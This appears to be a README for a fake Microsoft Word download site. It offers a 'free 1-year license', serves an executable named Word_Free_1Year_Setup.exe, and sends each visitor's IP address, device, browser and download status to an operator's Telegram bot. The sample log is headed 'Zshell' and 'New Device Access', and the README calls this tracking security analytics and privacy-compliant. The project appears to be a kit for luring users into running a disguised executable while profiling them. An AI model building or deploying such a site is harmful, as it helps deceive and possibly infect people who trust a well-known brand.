# Microsoft Word Free Download - With Telegram Logging

A professional Microsoft Word download website with comprehensive Telegram logging for tracking downloads and user analytics.

## 🚀 Features

- **Free Microsoft Word Downloads**: Offers 1-year free license instead of paid purchase
- **Real-time Telegram Logging**: Advanced download tracking with detailed user information
- **Professional UI**: Clean, Microsoft-styled interface
- **Client-Server Architecture**: Node.js Express backend with dynamic frontend
- **Comprehensive Analytics**: IP tracking, device detection, browser analysis

## 📋 Prerequisites

- Node.js (v14 or higher)
- Telegram Bot Token
- Telegram Chat ID for logging

## 🛠 Installation

1. **Clone the repository**
   ```bash
   git clone <your-repo-url>
   cd word-free-download
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Create environment file**
   ```bash
   cp .env.example .env
   ```

4. **Configure Telegram Bot** (See setup instructions below)

5. **Start the server**
   ```bash
   npm start
   ```

## 🤖 Telegram Bot Setup

### Step 1: Create a Telegram Bot
1. Open Telegram and search for `@BotFather`
2. Send `/newbot` command
3. Follow instructions to create your bot
4. Copy the **Bot Token** provided

### Step 2: Get Your Chat ID
1. Send a message to your bot
2. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
3. Find your **Chat ID** in the response

### Step 3: Configure Environment
Update your `.env` file:
```env
TELEGRAM_BOT_TOKEN=1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
TELEGRAM_CHAT_ID=123456789
```

## 📊 Telegram Logging Features

The system automatically logs:

### Download Attempts
- 🌍 User IP Address
- 🖥 Platform/Operating System
- 🌐 Browser Information
- 📱 Device Type
- ⏰ Timestamp
- 🔄 Referrer Information

### Success/Error Tracking
- ✅ Successful downloads
- ❌ Failed downloads with error details
- 📈 Real-time analytics

### Sample Log Format
```
🧛‍♂️ Zshell
📢 New Device Access
 DOCX CLIENT

🌍 IP: 192.168.1.100
🖥 Platform: Windows 10
🌐 Browser: Chrome 118.0
🌎 Country: Auto-detecting...

🔵 Docx User attempting to download Docx file
📱 Device: Windows
🌍 IP: 192.168.1.100
🌐 Browser: Chrome 118.0
📏 Resolution: Auto-detecting...
📐 Window: Auto-detecting...
⏰ Time: 12/07/2023, 14:30:25
🔄 Referrer: Direct

🔽 Docx user attempting to download Docx file for Windows device

✅ Docx file download started successfully for Windows device
```

## 🗂 Project Structure

```
/
├── server.js              # Main Express server with Telegram logging
├── package.json           # Dependencies and scripts
├── client/                # Frontend application
│   ├── index.html         # Main download page
│   ├── css/              # Stylesheets
│   ├── js/               # JavaScript files
│   ├── fonts/            # Font files
│   ├── images/           # Images and assets
│   └── downloads/        # Downloadable files
│       └── Word_Free_1Year_Setup.exe
├── .env.example          # Environment configuration template
└── README.md             # This file
```

## 🔧 API Endpoints

### `GET /api/product/info`
Returns product information with pricing
```json
{
  "productId": "cfq7ttc0pbmb",
  "title": "Word - Free 1 Year License",
  "price": {"current": "Free", "original": "$179.99"},
  "action": {"actionText": "Download Free Version"}
}
```

### `GET /api/download/word-free`
Initiates file download and triggers Telegram logging

## 🚀 Deployment

### Replit (Recommended)
1. Import the project to Replit
2. Set environment variables in Replit Secrets
3. The deployment is automatically configured

### Other Platforms
1. Configure environment variables
2. Ensure port 5000 is accessible
3. Run `npm start`

## 🔒 Security Features

- **IP Tracking**: Real-time IP logging for security monitoring
- **User Agent Analysis**: Comprehensive browser/device detection
- **Error Logging**: Detailed error tracking and reporting
- **Environment Variables**: Secure configuration management

## 📈 Analytics Dashboard

All download analytics are sent to your Telegram chat, providing:
- Real-time download notifications
- User demographics and device info
- Error tracking and debugging
- Success/failure rates

## 🛡 Privacy & Compliance

- IP addresses are logged for security purposes
- No personal data is stored permanently
- Logs are sent to your private Telegram chat
- Complies with standard web analytics practices

## 🆘 Troubleshooting

### Telegram Logs Not Working
1. Verify bot token is correct
2. Ensure chat ID is accurate
3. Check bot permissions
4. Confirm environment variables are set

### Download Issues
1. Check file exists in `client/downloads/`
2. Verify server is running on correct port
3. Check console logs for errors

### Browser Console Errors
Some Microsoft script errors are expected and don't affect functionality.

## 📄 License

MIT License - Feel free to use and modify for your projects.

## 🤝 Contributing

1. Fork the repository
2. Create feature branch
3. Commit changes
4. Push to branch
5. Create Pull Request

## 📞 Support

For issues or questions:
1. Check the troubleshooting section
2. Review server console logs
3. Verify Telegram bot configuration
4. Check environment variables

---

**Built with ❤️ for tracking Microsoft Word downloads with professional Telegram logging**